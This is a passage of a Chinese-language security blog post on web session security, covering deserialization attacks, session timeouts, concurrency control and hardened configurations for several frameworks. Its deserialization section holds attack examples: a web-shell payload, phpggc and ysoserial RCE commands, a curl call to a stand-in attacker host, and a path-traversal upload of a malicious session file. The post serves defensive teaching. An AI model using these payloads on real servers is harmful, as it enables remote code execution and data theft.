+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;logFile, <span class="variable">$this</span>-&gt;logData, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 构造 logFile=shell.php, logData=&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PHPGGC 生成 Payload</span></span><br><span class="line">phpggc -l                          <span class="comment"># 列出所有 Gadget Chain</span></span><br><span class="line">phpggc Monolog/RCE1 system <span class="string">&#x27;id&#x27;</span></span><br><span class="line">phpggc Laravel/RCE1 system <span class="string">&#x27;whoami&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Java-Session-反序列化"><a href="#Java-Session-反序列化" class="headerlink" title="Java Session 反序列化"></a>Java Session 反序列化</h3><p>Tomcat 以序列化文件存 Session 于 <code>work/Catalina/localhost/</code>。Classpath 有 Gadget Chain 时写入恶意序列化对象即可 RCE：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 <span class="string">&#x27;curl attacker.com/$(id)&#x27;</span> &gt; evil.session</span><br><span class="line">curl -X PUT --data-binary @evil.session \</span><br><span class="line">  <span class="string">&#x27;https://target.com/upload/../../work/Catalina/localhost/ROOT/evil.session&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>常用 Gadget：CommonsCollections1-7、CommonsBeanutils1、Spring1&#x2F;2、Jdk7u21。检测先用 <code>ysoserial URLDNS</code> 做 DNS 探测。</p>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
+<li>不反序列化不可信数据；用 JSON 序列化替代原生反序列化</li>
+<li>Java：<code>ValidatingObjectInputStream</code> 白名单过滤</li>
+<li>限制 Session 目录写入权限，定期清理文件</li>
+</ul>
+<hr>
+<h2 id="六、Session-超时与并发控制"><a href="#六、Session-超时与并发控制" class="headerlink" title="六、Session 超时与并发控制"></a>六、Session 超时与并发控制</h2><p><strong>超时风险：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session.gc_maxlifetime = <span class="number">0</span>      <span class="comment">// 永不过期 — 极危险</span></span><br><span class="line">session.gc_maxlifetime = <span class="number">86400</span>  <span class="comment">// 24小时</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>常见失误 — 退出仅删 Cookie 不销毁 Session：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ❌ 服务端 Session 仍有效</span></span><br><span class="line">resp.delete_cookie(<span class="string">&#x27;sessionid&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ✅ 先销毁再清 Cookie</span></span><br><span class="line">session.clear()</span><br><span class="line">resp.delete_cookie(<span class="string">&#x27;sessionid&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>合理策略：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">session.setMaxInactiveInterval(<span class="number">30</span> * <span class="number">60</span>);  <span class="comment">// 闲置 30min</span></span><br><span class="line"><span class="comment">// 绝对超时 8h 强制重认证</span></span><br><span class="line"><span class="keyword">if</span> (now - (<span class="type">long</span>)session.getAttribute(<span class="string">&quot;LOGIN_TIME&quot;</span>) &gt; <span class="number">8</span>*<span class="number">3600</span>*<span class="number">1000</span>) &#123;</span><br><span class="line">    session.invalidate(); response.sendRedirect(<span class="string">&quot;/login?reason=timeout&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>并发控制：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">login</span><span class="params">(String user, String sid)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(user)) sessionRegistry.get(map.get(user)).invalidate();</span><br><span class="line">    map.put(user, sid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="七、防御最佳实践"><a href="#七、防御最佳实践" class="headerlink" title="七、防御最佳实践"></a>七、防御最佳实践</h2><p><strong>纵深防御体系：</strong></p>
+<ul>
+<li><strong>传输</strong>：全站 HTTPS + HSTS (max-age&gt;&#x3D;1年, includeSubDomains)，Cookie Secure</li>
+<li><strong>标识符</strong>：CSPRNG &gt;&#x3D;128bits SID，登录后 regenerate，禁 URL 传参</li>
+<li><strong>属性</strong>：HttpOnly + SameSite&#x3D;Lax + <code>__Host-</code> 前缀，缺一不可</li>
+<li><strong>生命周期</strong>：闲置 15-30min，绝对 4-8h，退出销毁，改密全失效</li>
+<li><strong>检测</strong>：IP&#x2F;UA 绑定，并发控制，异常告警</li>
+</ul>
+<p><strong>各语言安全配置：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PHP php.ini</span></span><br><span class="line">session.cookie_secure = On</span><br><span class="line">session.cookie_httponly = On</span><br><span class="line">session.cookie_samesite = <span class="string">&quot;Lax&quot;</span></span><br><span class="line">session.use_strict_mode = <span class="number">1</span></span><br><span class="line">session.use_only_cookies = <span class="number">1</span></span><br><span class="line">session.use_trans_sid = <span class="number">0</span></span><br><span class="line">session.sid_length = <span class="number">48</span></span><br><span class="line">session.gc_maxlifetime = <span class="number">1440</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Java web.xml --&gt;</span><br><span class="line">&lt;session-config&gt;</span><br><span class="line">    &lt;session-timeout&gt;<span class="number">30</span>&lt;/session-timeout&gt;</span><br><span class="line">    &lt;cookie-config&gt;&lt;http-only&gt;<span class="literal">true</span>&lt;/http-only&gt;&lt;secure&gt;<span class="literal">true</span>&lt;/secure&gt;&lt;/cookie-config&gt;</span><br><span class="line">    &lt;tracking-mode&gt;COOKIE&lt;/tracking-mode&gt;</span><br><span class="line">&lt;/session-config&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Flask</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line">app.config.update(SESSION_COOKIE_SECURE=<span class="literal">True</span>, SESSION_COOKIE_HTTPONLY=<span class="literal">True</span>,</span><br><span class="line">                  SESSION_COOKIE_SAMESITE=<span class="string">&#x27;Lax&#x27;</span>,</span><br><span class="line">                  PERMANENT_SESSION_LIFETIME=timedelta(minutes=<span class="number">30</span>))</span><br><span class="line">app.secret_key = os.urandom(<span class="number">32</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Node.js express-session</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">RedisStore</span> = <span class="built_in">require</span>(<span class="string">&#x27;connect-redis&#x27;</span>)(session);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">store</span>: <span class="keyword">new</span> <span class="title class_">RedisStore</span>(&#123; <span class="attr">client</span>: redisClient &#125;),</span><br><span class="line">    <span class="attr">secret</span>: process.<span class="property">env</span>.<span class="property">SESSION_SECRET</span>, <span class="attr">name</span>: <span class="string">&#x27;__Host-sid&#x27;</span>,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>, <span class="attr">saveUninitialized</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123; <span class="attr">secure</span>: <span class="literal">true</span>, <span class="attr">httpOnly</span>: <span class="literal">true</span>, <span class="attr">sameSite</span>: <span class="string">&#x27;lax&#x27;</span>, <span class="attr">maxAge</span>: <span class="number">30</span>*<span class="number">60</span>*<span class="number">1000</span>, <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span> &#125;</span><br><span class="line">&#125;));</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> req.<span class="property">session</span>.<span class="title function_">regenerate</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span> = user.<span class="property">id</span>; res.<span class="title function_">redirect</span>(<span class="string">&#x27;/dashboard&#x27;</span>);</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>
+
+<p><strong>Nginx 反向代理加固：</strong></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=63072000; includeSubDomains; preload&quot;</span> always;</span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://backend:8080;</span><br><span class="line">        <span class="attribute">proxy_cookie_path</span> / <span class="string">&quot;/; Secure; HttpOnly; SameSite=Lax&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>渗透测试检查清单：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[ ] 全站 HTTPS + HSTS？HTTP 降级？</span><br><span class="line">[ ] Cookie Secure/HttpOnly/SameSite？</span><br><span class="line">[ ] 登录后 SID 再生成？退出销毁？</span><br><span class="line">[ ] SID 可预测？（Burp Sequencer）</span><br><span class="line">[ ] URL 可传 SID？固定漏洞？反序列化点？</span><br><span class="line">[ ] 关键操作二次认证？超时合理？改密旧 Session 失效？并发控制？</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Session 安全是纵深防御典型场景：传输层全站 HTTPS + HSTS + Cookie Secure；标识符层 CSPRNG 强随机 + 登录后 regenerate；属性层 HttpOnly + SameSite&#x3D;Lax + <code>__Host-</code> 前缀；存储层谨防反序列化；生命周期层合理超时 + 退出销毁 + 改密全失效；检测层 IP&#x2F;UA 绑定 + 异常告警。纵深防御使攻击成本呈指数级增长。</p>
+<hr>
+<p><em>参考资料：OWASP Session Management Cheat Sheet · PHP Session 安全文档 · Tomcat Session 持久化 · RFC 6265</em></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/GraphQL-security/" rel="prev" title="GraphQL安全测试">
+                  <i class="fa fa-angle-left"></i> GraphQL安全测试
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/IDOR-horizontal-vertical/" rel="next" title="越权漏洞：水平越权与垂直越权">
+                  越权漏洞：水平越权与垂直越权 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
